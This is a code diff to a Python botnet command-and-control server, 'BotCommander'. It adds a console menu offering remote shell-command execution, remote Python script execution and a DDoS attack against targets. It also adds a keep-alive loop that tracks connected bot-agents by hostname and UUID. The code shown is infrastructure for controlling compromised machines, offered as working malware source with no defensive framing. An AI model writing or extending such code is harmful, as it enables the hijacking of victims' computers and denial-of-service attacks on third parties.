@@ -1,8 +1,7 @@
 import os
 import asyncio
-import json
+from threading import Thread
 from pathlib import Path
-import time
 import configparser
 from logger import CoreLogger
 from socket import socket, AF_INET, SOCK_STREAM
@@ -35,25 +34,82 @@ class BotCommander:
         self.port = port
         self.conn_rcv = conn_rcv
         self.sock = socket(AF_INET, SOCK_STREAM)
+        self.user_thread = Thread(target=self.__get_user_input).start()
         asyncio.run(self.__run())
 
-    async def __send_instructions(self, reader, writer):
-        message = "Hello"
-        addr = writer.get_extra_info('peername')
-        logger.core.debug(f"Sending data {message} to peer {addr}")
-        writer.write(message.encode("utf-8"))
+    @staticmethod
+    def __print_help():
+        print('''
+        Welcome to Commander CLI!
+        The following options are available:
+        1) Execute shell/cmd commands
+        2) Execute python script
+        3) Perform DDOS attack         
+        ''')
 
-        data = await reader.read(self.conn_rcv)
-        message = data.decode("utf-8")
-        logger.core.debug(f"Received {message} from {addr}")
+    def __get_user_input(self):
+        self.__print_help()
+        while True:
+            val = 0
+            cmd = input("Please insert a digit representing the option you want to choose: ")
+            try:
+                val = int(cmd)
+            except ValueError:
+                print("You have not inserted a digit, please insert a digit.")
+            except Exception as err:
+                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
+                      f" This is the error: {err}")
+            if val in range(1, 4):
+                return val
+            else:
+                print("Please insert a digit corresponding to one of the available options, 1, 2 or 3")
 
-        writer.close()
+    async def __proces_keep_alive(self, reader, writer, addr, hostname, uuid):
+        while True:
+            try:
+                data = await reader.read(self.conn_rcv)
+            except Exception as err:
+                logger.core.error(f"Unexpected exception when reading keep-alive hello from peer {hostname}: {err},"
+                                  f" closing connection")
+                writer.close()
+                return
+            if data:
+                try:
+                    msg = data.decode("utf-8")
+                    if msg == "Hello":
+                        logger.core.debug(f"Received Hello from bot-agent {hostname}:{addr}")
+                        self.uuids[uuid] = (hostname, True)
+                        logger.core.debug(f"Bot-agent {hostname}:{addr} is still online")
+                        try:
+                            logger.core.debug(f"Sending HelloReply to bot-agent {hostname}:{addr}")
+                            writer.write(b"HelloReply")
+                        except Exception as err:
+                            logger.core.error(f"Unexpected exception when sending HelloReply to {hostname}: {err},"
+                                              f" closing connection")
+                            writer.close()
+                            return
+                    else:
+                        logger.core.error(f"Unknown message received from peer {hostname}:{addr}, expecting Hello."
+                                          f" Closing connection")
+                        writer.close()
+                        return
+                except Exception as err:
+                    logger.core.error(f"Unexpected error while decoding data from peer {hostname}:{addr}. Expecting"
+                                      f"hello for keep-alive: {err}")
+                    writer.close()
+                    return
+            else:
+                logger.core.error(f"EOF received when waiting for keep-alive hello from bot-agent {hostname}:{addr},"
+                                  f" closing connection")
+                writer.close()
+                return
 
     async def __identify_agent(self, reader, writer):
         addr = writer.get_extra_info('peername')
         logger.core.info(f"Connection accepted from peer {addr}")
         hostname = await self.__get_hostname(reader, writer, addr)
-        await self.__process_uuid(reader, writer, addr, hostname)
+        uuid = await self.__process_uuid(reader, writer, addr, hostname)
+        asyncio.create_task(self.__proces_keep_alive(reader, writer, addr, hostname, uuid))
 
     async def __process_uuid(self, reader, writer, addr, hostname):
         try:
@@ -82,6 +138,7 @@ class BotCommander:
                               f" closing connection")
             writer.close()
             return
+        return uuid
 
     @staticmethod
     def __get_uuid_payload():
